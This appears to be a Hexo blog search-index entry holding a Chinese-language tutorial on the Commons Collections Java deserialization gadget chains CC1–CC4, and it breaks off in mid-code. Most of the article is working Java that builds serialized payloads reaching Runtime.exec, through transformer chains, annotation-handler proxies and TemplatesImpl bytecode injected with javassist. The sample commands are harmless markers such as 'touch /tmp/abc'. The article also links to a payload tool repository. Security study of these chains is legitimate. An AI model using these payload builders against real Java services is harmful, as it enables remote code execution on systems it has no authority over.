<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CommonsCollections 系列反序列化</title>
    <url>/gadgets/CommonsCollections%20%E7%B3%BB%E5%88%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想真正入门 Java 安全，CommonsCollections 系列反序列化利用链是一个非常好的学习资源，个人感觉看完后收获颇丰，我把比较关键的一些点都记录下来了，并把这些零散的内容整理成了一份表格放在这篇文章最后，如果不关心背后的原理，直接看最后的总结即可。文中提到的那些 K1 ~ K4 可以从这里直接下载使用：<a href="https://github.com/nuxl1r/JNDI-NU">https://github.com/nuxl1r/JNDI-NU</a></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown96074895_p9.jpg"></p>
<span id="more"></span>

<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &lt; 8u71</li>
</ul>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map(Proxy).entrySet()</span><br><span class="line">      AnnotationInvocationHandler.invoke()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">            ConstantTransformer.transform()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Class.getMethod()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.getRuntime()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.exec()</span><br><span class="line">            ConstantTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>大致可以分为两部分，一部分是构造 <code>ChainedTransformer</code> ，另一部分是设法调用这个 chain 的 <code>transform</code> 方法。其中前者可以直接表示为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;say yes&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>当 这里的 <code>chain.transform</code> 被调用时，执行的命令类似:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;say yes&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>更深入的，调用过程类似下面的反射调用:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Object.class.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">getRuntime</span> <span class="operator">=</span> m.invoke(Runtime.class, <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">cls = getRuntime.getClass();</span><br><span class="line">m = cls.getMethod(<span class="string">&quot;invoke&quot;</span>, Object.class, Object[].class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> m.invoke(getRuntime, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">m = runtime.getClass().getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">m.invoke(runtime, <span class="string">&quot;say yes&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>关键在于如何去调用这个 chain 的 <code>transform</code> 方法，ysoserial 的 CommonsCollections1 用的调用链依赖于两次 <code>AnnotationInvocationHandler</code> 的代理和一个 <code>LazyMap</code> 的最终触发，这个过程完整手写的话如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;touch /tmp/aaaa&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, execArgs),</span><br><span class="line">    <span class="comment">// 注意这里多了一个 HashSet，这样可以避免原版的一个 Cast Error</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;())&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当 LazyMap.get 被调用时，会触发 chain.transform</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里的 Deprecated.class 可以换成任意一个 AnnotationType </span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Deprecated.class, m);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里套一层 proxy 为了在 readObject 是调用 entrySet 时调用 AnnotationInvocation 的 invoke 方法, 其中会调用 lazyMap 的 get 从而触发</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(handler.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最外层是 AnnotationInvocationHandler，触发 readObject 操作</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Deprecated.class, proxy);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(obj);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections1-1"><a href="#CommonsCollections1-1" class="headerlink" title="CommonsCollections1_1"></a>CommonsCollections1_1</h1><h2 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &lt; 8u71</li>
</ul>
<h2 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    TransformedMap.setValue()</span><br><span class="line">      ChainedTransformer.transform()</span><br><span class="line">        ConstantTransformer.transform()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">          Method.invoke()</span><br><span class="line">            Class.getMethod()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">          Method.invoke()</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">          Method.invoke()</span><br><span class="line">            Runtime.exec()</span><br><span class="line">        ConstantTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>我在看上面的 1 时，发现还有个别的利用链可以用，不再使用 <code>LazyMap</code>  而是使用 <code>TransformedMap</code> ，调用链略有差异，利用链深度也简单一些。这个利用链用原生代码可以表示为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">// 这个值不可改</span></span><br><span class="line">hashMap.put(<span class="string">&quot;value&quot;</span>, SuppressWarnings.class);</span><br><span class="line"><span class="comment">// sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最终调用链是 readObject 时的 setValue -&gt; transformedMap.setValue -&gt; chained</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">tm</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>), chain);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(SuppressWarnings.class, tm);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(handler);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<p>需要注意的是，这里在 hashMap 中放的不是任意的，需要满足这两点才可以:</p>
<ul>
<li>class 为 Annotation</li>
<li>该注解包含至少一个方法</li>
<li>hashMap put 的 key 就是方法名之一</li>
</ul>
<p>实际用起来效果和 1 应该是一致的，只是 payload 要短一点。</p>
<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="依赖-2"><a href="#依赖-2" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections4.0</li>
</ul>
<h2 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    ...</span><br><span class="line">      TransformingComparator.compare()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">            TemplatesImpl.newTransformer()</span><br><span class="line">              TemplatesTmpl.getTransletInstance()</span><br><span class="line">                TemplatesTmpl.defineTransletClasses()</span><br><span class="line">                TemplatesTmpl.newInstance()</span><br><span class="line">                	ClassInitializer()</span><br><span class="line">                    Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(&#x27;1&#x27;);&#125;&quot;</span>;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Exception.class.getName());</span><br><span class="line">    clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">    clazz.setName(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] byteCode = clazz.toBytecode();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// load bytecode</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefiningClassLoader</span>().defineClass(<span class="string">&quot;demo&quot;</span>, byteCode);</span><br><span class="line">    cls.newInstance();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 效果类似</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exception</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span> &#123;</span><br><span class="line">    &#123;System.out.println(<span class="string">&#x27;1&#x27;</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码展示了两个小知识，一是可以利用 <code>ClassLoader</code> 去加载字节码然后执行，而是借助 javassist 的强大魅力，可以轻松的给已有的类做编排（Instrumenting）内置类型 Exception 增加一段 static 代码块，加载字节码市，静态代码块就会被执行，借助这个特性，可以做一些非常 Magic 和 Amazing 的事情。</p>
<p>&#96;CommonCollections2 和下面的几个利用链都用到了</p>
<p> <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类，这个类有个特性当调用 <code>newTransform</code> 时，会加载内部的 &#96;_bytecode 中的字节码并实例化，这个利用链手写大致如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FooBar</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123; &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">String</span> <span class="variable">AbstractTranslet</span> <span class="operator">=</span> <span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(FooBar.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Class.forName(AbstractTranslet)));</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">bar</span> <span class="operator">=</span> pool.get(FooBar.class.getName());</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">translet</span> <span class="operator">=</span> pool.get(Class.forName(AbstractTranslet).getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给 bar 动态设置父类，同时设置 static 的初始化恶意代码</span></span><br><span class="line">    bar.setSuperclass(translet);</span><br><span class="line">    bar.makeClassInitializer().insertBefore(<span class="string">&quot;&#123;Runtime.getRuntime().exec(\&quot;touch /tmp/abc\&quot;);&#125;&quot;</span>);</span><br><span class="line">    <span class="comment">// hack it. 为了避免 postInitialization 的调用，防止反序列化报错</span></span><br><span class="line">    bar.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">CtClass</span>[<span class="number">0</span>]).insertAfter(<span class="string">&quot;&#123;$0.transletVersion=101;&#125;&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] b = bar.toBytecode();</span><br><span class="line">    <span class="comment">// 这个是为了避免 _auxClasses 为空导致的 Exception</span></span><br><span class="line">    <span class="type">byte</span>[] foo = pool.get(Gadgets.Foo.class.getName()).toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化方法没用开，用反射做</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor(<span class="type">byte</span>[][].class, String.class, Properties.class, <span class="type">int</span>.class, TransformerFactoryImpl.class);</span><br><span class="line">    con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> (Templates) con.newInstance(<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;b, foo&#125;, <span class="string">&quot;abc&quot;</span>, <span class="keyword">new</span> <span class="title class_">Properties</span>(), <span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 后续调用链只需触发 tpl.newTransformer() 即可触发</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里相比原版加了一行 <code>bar.getDeclaredConstructor(new CtClass[0]).insertAfter(&quot;&#123;$0.transletVersion=101;&#125;&quot;);</code> 这个可以有效防止序列化之后的报错，整个序列化流程跑完没有任何异常，非常舒服。我们将这个函数保存为 <code>createTemplate()</code> ，后面就不用再写相同代码了。至于触发方法，在 CommonsCollections2 中用的是这样的利用链:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = tpl;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write queue</span></span><br></pre></td></tr></table></figure>

<p>这里用了一个小技巧是利用反射延迟设置 queue 内部的值，防止 <code>queue.add</code> 时利用链就被触发了。但这个成功反序列化后也会有个错误，原因是 Templeates 被实例化后是不可被比较的，我把利用链稍微调整了一下就可以规避这个问题，这个利用链支调整了最终 transform 的逻辑，核心触发逻辑没变，就不作为 2_1 来写了:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> MyGadget.createTemplate();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(tpl),</span><br><span class="line">    invokerTransformer,</span><br><span class="line">    <span class="comment">// 返回一个 constant 值，防止报错</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">&#125;);</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write queue</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><h2 id="依赖-3"><a href="#依赖-3" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &lt; 8u71</li>
</ul>
<h2 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map(Proxy).entrySet()</span><br><span class="line">      AnnotationInvocationHandler.invoke()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">          <span class="comment">// 变的是下面这部分</span></span><br><span class="line">            ConstantTransformer.transform()</span><br><span class="line">            InstantiateTransformer.transform()</span><br><span class="line">            	TrAXFilter()</span><br><span class="line">                TemplatesImpl.newTransformer()</span><br><span class="line">                  TemplatesTmpl.getTransletInstance()</span><br><span class="line">                    TemplatesTmpl.defineTransletClasses()</span><br><span class="line">                    TemplatesTmpl.newInstance()</span><br><span class="line">                      ClassInitializer()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>和 CommonCollectins1 的前半部分是一致的，所以依赖都是一致的。不同的是借助 <code>InstantiateTransformer</code> 和 <code>TrAXFilter</code> 这个链完成 TemplateImpl 的实例化，能利用的原因在于 <code>TrAXFilter</code> 这个类的实例化函数是这样的:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">	_templates = templates;</span><br><span class="line">	_transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>顺手可以手写一份利用代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> MyGadget.createTemplate();</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl&#125;),</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// chain 的触发和 1 一样，不再赘述</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="依赖-4"><a href="#依赖-4" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections4.0</li>
</ul>
<h2 id="利用链-4"><a href="#利用链-4" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    ...</span><br><span class="line">      TransformingComparator.compare()</span><br><span class="line">        ChainedTransformer.transform()</span><br><span class="line">        <span class="comment">// 变的是下面这部分</span></span><br><span class="line">          ConstantTransformer.transform()</span><br><span class="line">          InstantiateTransformer.transform()</span><br><span class="line">          	TrAXFilter()</span><br><span class="line">              TemplatesImpl.newTransformer()</span><br><span class="line">                TemplatesTmpl.getTransletInstance()</span><br><span class="line">                  TemplatesTmpl.defineTransletClasses()</span><br><span class="line">                  TemplatesTmpl.newInstance()</span><br><span class="line">                    ClassInitializer()</span><br><span class="line">                      Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>这个就是 2 的后半部分用了 <code>InstantiateTransformer</code> ，和我自己写的那个只有一点点的不一样，不再赘述</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">tpl</span> <span class="operator">=</span> MyGadget.createTemplate();</span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">initTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    constantTransformer,</span><br><span class="line">    initTransformer,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title 